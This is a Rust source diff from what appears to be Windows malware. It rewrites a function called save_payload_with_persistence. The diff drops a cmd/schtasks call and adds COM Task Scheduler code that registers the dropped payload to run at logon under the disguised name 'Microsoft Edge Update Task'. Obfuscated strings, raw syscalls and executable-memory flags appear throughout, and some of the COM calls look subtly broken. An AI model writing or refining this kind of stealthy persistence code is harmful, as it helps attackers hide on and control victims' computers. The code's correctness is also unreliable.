@@ -6,8 +6,6 @@ mod syscalls;
 #[cfg(windows)]
 use std::{mem, ptr};
 #[cfg(windows)]
-use std::process::Command;
-#[cfg(windows)]
 use hex::ToHex;
 #[cfg(windows)]
 use rand::Rng;
@@ -32,6 +30,35 @@ use winapi::um::winnt::{
     MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
     PAGE_READWRITE,
 };
+
+#[cfg(windows)]
+use windows_sys::core::{BSTR, VARIANT};
+#[cfg(windows)]
+use windows_sys::Win32::System::Com::{
+    CoCreateInstance, CoInitializeEx, CoUninitialize, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
+    SysFreeString,
+};
+#[cfg(windows)]
+use windows_sys::Win32::System::TaskScheduler::{
+    IExecAction, ILogonTrigger, IPrincipal, IRegisteredTask, ITaskDefinition, ITaskFolder,
+    ITaskService, ITriggerCollection, TaskScheduler, TASK_ACTION_EXEC, TASK_CREATE_OR_UPDATE,
+    TASK_LOGON_INTERACTIVE_TOKEN, TASK_RUNLEVEL_LUA, TASK_TRIGGER_LOGON,
+};
+
+#[cfg(windows)]
+// COM Pointer wrapper for automatic Release
+struct ComPtr<T>(*mut T);
+
+#[cfg(windows)]
+impl<T> Drop for ComPtr<T> {
+    fn drop(&mut self) {
+        if !self.0.is_null() {
+            unsafe {
+                ((*self.0 as *mut windows_sys::core::IUnknown)).Release();
+            }
+        }
+    }
+}
 
 // PE Header structures
 #[repr(C)]
@@ -390,40 +417,119 @@ unsafe fn save_payload_with_persistence() -> Result<(), String> {
         return Err(format!("{}{:X}", obfuscate_string!("NtWriteFile failed with status: "), write_status));
     }
 
-    // Schedule task
-    let task_name = obfuscate_string!("SystemUpdateScheduler");
-    let command = format!(
-        "schtasks /create /sc onlogon /tn \"{}\" /tr \"{}\" /ru \"System\" /f",
-        task_name,
-        full_file_path_win
+    // COM-based Task Scheduler
+    if CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED) < 0 {
+        return Err(obfuscate_string!("Failed to initialize COM.").to_string());
+    }
+
+    let task_service = ComPtr({
+        let mut service = ptr::null_mut();
+        if CoCreateInstance(
+            &TaskScheduler,
+            ptr::null_mut(),
+            CLSCTX_INPROC_SERVER,
+            &ITaskService::IID,
+            &mut service,
+        ) < 0
+        {
+            CoUninitialize();
+            return Err(obfuscate_string!("Failed to create Task Scheduler instance.").to_string());
+        }
+        service as *mut ITaskService
+    });
+
+    (*task_service.0).Connect(
+        VARIANT { vt: 0 },
+        VARIANT { vt: 0 },
+        VARIANT { vt: 0 },
+        VARIANT { vt: 0 },
     );
 
-    let mut cmd = Command::new(obfuscate_string!("cmd"));
-    cmd.args(&["/C", &command]);
+    let root_folder = ComPtr({
+        let mut folder = ptr::null_mut();
+        let root_folder_name: Vec<u16> = "\\".encode_utf16().collect();
+        let root_folder_bstr = BSTR::from_wide(&root_folder_name);
+        if (*task_service.0).GetFolder(root_folder_bstr.as_raw(), &mut folder) < 0 {
+            SysFreeString(root_folder_bstr.as_raw());
+            CoUninitialize();
+            return Err(obfuscate_string!("Failed to get root task folder.").to_string());
+        }
+        SysFreeString(root_folder_bstr.as_raw());
+        folder
+    });
 
-    match cmd.output() {
-        Ok(output) => {
-            if !output.status.success() {
-                // Fallback to user-level task if system-level fails for any reason
-                let user_command = format!(
-                    "schtasks /create /sc onlogon /tn \"{}\" /tr \"{}\" /f",
-                    task_name,
-                    full_file_path_win
-                );
-                let mut user_cmd = Command::new(obfuscate_string!("cmd"));
-                user_cmd.args(&["/C", &user_command]);
-                match user_cmd.output() {
-                    Ok(user_output) => {
-                        if !user_output.status.success() {
-                            return Err(format!("{}{}", obfuscate_string!("Failed to create user-level scheduled task: "), String::from_utf8_lossy(&user_output.stderr)));
-                        }
-                    },
-                    Err(e) => return Err(format!("{}{}", obfuscate_string!("Failed to execute user-level schtasks: "), e)),
-                }
-            }
-        },
-        Err(e) => return Err(format!("{}{}", obfuscate_string!("Failed to execute schtasks: "), e)),
+    let task_definition = ComPtr({
+        let mut definition = ptr::null_mut();
+        if (*task_service.0).NewTask(0, &mut definition) < 0 {
+            CoUninitialize();
+            return Err(obfuscate_string!("Failed to create new task definition.").to_string());
+        }
+        definition
+    });
+
+    let principal = ComPtr({
+        let mut p = ptr::null_mut();
+        if (*task_definition.0).get_Principal(&mut p) < 0 {
+            CoUninitialize();
+            return Err(obfuscate_string!("Failed to get principal.").to_string());
+        }
+        p
+    });
+    if (*principal.0).put_RunLevel(TASK_RUNLEVEL_LUA) < 0 {
+        CoUninitialize();
+        return Err(obfuscate_string!("Failed to set run level.").to_string());
     }
+
+    let triggers = ComPtr({
+        let mut t = ptr::null_mut();
+        (*task_definition.0).get_Triggers(&mut t);
+        t
+    });
+
+    let trigger = ComPtr({
+        let mut t = ptr::null_mut();
+        (*triggers.0).Create(TASK_TRIGGER_LOGON, &mut t);
+        t as *mut ILogonTrigger
+    });
+
+    let action_collection = ComPtr({
+        let mut ac = ptr::null_mut();
+        (*task_definition.0).get_Actions(&mut ac);
+        ac
+    });
+
+    let action = ComPtr({
+        let mut a = ptr::null_mut();
+        (*action_collection.0).Create(TASK_ACTION_EXEC, &mut a);
+        a as *mut IExecAction
+    });
+
+    let path_bstr = BSTR::from_wide(full_file_path_win.encode_utf16().collect::<Vec<u16>>().as_slice());
+    (*action.0).put_Path(path_bstr.as_raw());
+    SysFreeString(path_bstr.as_raw());
+
+    let task_name_bstr = BSTR::from_wide(obfuscate_string!("Microsoft Edge Update Task").encode_utf16().collect::<Vec<u16>>().as_slice());
+    let registered_task = ComPtr({
+        let mut rt = ptr::null_mut();
+        let result = (*root_folder.0).RegisterTaskDefinition(
+            task_name_bstr.as_raw(),
+            task_definition.0,
+            TASK_CREATE_OR_UPDATE as i32,
+            VARIANT { vt: 0 },
+            VARIANT { vt: 0 },
+            TASK_LOGON_INTERACTIVE_TOKEN,
+            VARIANT { vt: 0 },
+            &mut rt,
+        );
+        SysFreeString(task_name_bstr.as_raw());
+        if result < 0 {
+            CoUninitialize();
+            return Err(format!("{}{:x}", obfuscate_string!("Failed to register task: "), result));
+        }
+        rt
+    });
+
+    CoUninitialize();
 
     Ok(())
 }
